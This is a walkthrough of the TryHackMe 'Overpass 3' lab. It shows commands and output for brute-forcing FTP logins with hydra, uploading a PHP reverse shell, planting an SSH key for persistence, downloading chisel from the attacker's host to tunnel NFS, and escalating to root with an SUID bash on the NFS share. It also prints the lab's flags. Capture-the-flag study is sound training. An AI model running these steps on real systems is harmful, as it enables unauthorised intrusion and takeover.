# TryHackMe [Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)
### References
* Alexander, D. (2021, January 18). Overpass 3 TryHackMe Writeup - Darren Alexander - Medium. Medium; Medium. https://darrenerawan.medium.com/overpass3-tryhackme-writeup-106fc1d65dde
* Shishir Subedi. (2021, January 14). Overpass 3 TryHackMe Writeup. Shishir’s Blog. https://shishirsubedi.com.np/thm/overpass3/
## Reconnaissance
### `nmap`
* The server runs:
  * FTP on port 21
  * SSH on port 22
  * HTTP on port 80
```bash
$  nmap -sV -sC <MACHINE_IP> 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 16:16 AEST
Nmap scan report for <MACHINE_IP>
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
```
### `gobuster`
* The server responds to `/backups`:
```bash
$ gobuster dir -u http://<MACHINE_IP>/ -w $(pwd)/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<MACHINE_IP>/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/applegamer22/Documents/CTFs/TryHackMe/Overpass/Part3/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/01 16:22:59 Starting gobuster in directory enumeration mode
===============================================================
/backups              (Status: 301) [Size: 234] [--> http://<MACHINE_IP>/backups/]
```
## Web Flag
1. Get the `backup.zip` from `http://<MACHINE_IP>/backups`
```bash
$ unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg
  inflating: priv.key
```
2. Use `priv.key` to decrypt the spreadsheet:
```
$ gpg --import priv.key
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

```
3. The spreadsheet contains credentials, we can use `awk` to extract them from each column of the spreadsheet and use `hydra` to check which pair of credentials authenticate with the FTP server:
```bash
$ libreoffice --headless --convert-to csv CustomerDetails.xlsx
$ awk -F ',' 'NR > 1 {print $2}' CustomerDetails.csv > users
$ awk -F ',' 'NR > 1 {print $3}' CustomerDetails.csv > passwords
$ hydra -L users -P passwords ftp://<MACHINE_IP> 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-01 16:47:05
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ftp://<MACHINE_IP>:21/
[21][ftp] host: <MACHINE_IP>   login: paradox   password: ShibesAreGreat123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-01 16:47:10
```
4. Use username `paradox` and password `ShibesAreGreat123` to access the FTP server and upload a reverse shell with the IP address of your OpenVPN connection:
```bash
$ ftp <MACHINE_IP>
Connected to <MACHINE_IP>.
220 (vsFTPd 3.0.3)
Name (<MACHINE_IP>:applegamer22): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17 23:54 .
drwxrwxrwx    3 48       48             94 Nov 17 23:54 ..
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.
ftp> put php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5490 bytes sent in 2.5e-05 seconds (209 Mbytes/s)
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48            123 May 01 06:49 .
drwxrwxrwx    3 48       48            123 May 01 06:49 ..
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
-rw-r--r--    1 1001     1001         5490 May 01 06:49 php-reverse-shell.php
226 Directory send OK.
ftp>
```
5. Use `nc` to listen to reverse shell traffic from the port your set in the `php-reverse-shell.php` file and get a stable shell. After that, list all users with a `bash` shell.
```bash
sh-4.4$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:James:/home/james:/bin/bash
paradox:x:1001:1001::/home/paradox:/bin/bash
```
6. Switch to the `paradox` user with the same password has described in the spreadsheet, and generate an SSH public key (with `ssh-keygen -f paradox`) to access it more easily:
```bash
bash-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
[paradox@localhost /]$ cd
[paradox@localhost ~]$ echo '<SSH_public_key>' > .ssh/authorized_keys
```
7. Find the web flag:
```bash
$ ssh -i paradox paradox@<MACHINE_IP> 
[paradox@localhost ~]$ find / -name *.flag 2>/dev/null
/usr/share/httpd/web.flag
[paradox@localhost ~]$ cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
```

**Flag**: `thm{0ae72f7870c3687129f7a824194be09d}`
## User Flag
1. Get `chisel` from GitHub and start a web server with `sudo python -m http.server 80`
2. Start a `chisel` server on your machine:
```bash
$ chmod +x chisel
$ ./chisel server --reverse --port 1337
```
3. Download `chisel` to the server, and connect to your machine;
```
[paradox@localhost ~]$ curl http://<OPENVPN_IP>/chisel -o chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8144k  100 8144k    0     0  1103k      0  0:00:07  0:00:07 --:--:-- 1415k 
[paradox@localhost ~]$ chmod +x chisel 
[paradox@localhost ~]$ ./chisel client <OPENVPN_IP>:1337 R:2049:127.0.0.1:2049
```
4. Mount the NFS directory:
```
$ mkdir mount
$ sudo mount -t nfs localhost:/ mount/
```
5. Obtain `user.flag`:
```bash
$ cd mount
$ ls
user.flag
$ cat user.flag 
thm{3693fc86661faa21f16ac9508a43e1ae}
```
## Root Flag
1. Use `mount/.ssh/id_rsa` to access the server as `james`:
```bash
$ ssh -i .ssh/id_rsa james@<MACHINE_IP>
[james@localhost ~]$ cp /bin/bash bash
```
2. On your machine, change the SUID permissions on the copied `bash` binary on the NFS mount:
```bash
$ sudo chown root:root mount/bash
$ chmod +s mount/bash
$ sudo chmod +s mount/bash
```
3. On the server, escalate privileges:
```bash
[james@localhost ~]$ ./bash -p
bash-4.4# cat /root/root.flag
thm{a4f6adb70371a4bceb32988417456c44}
```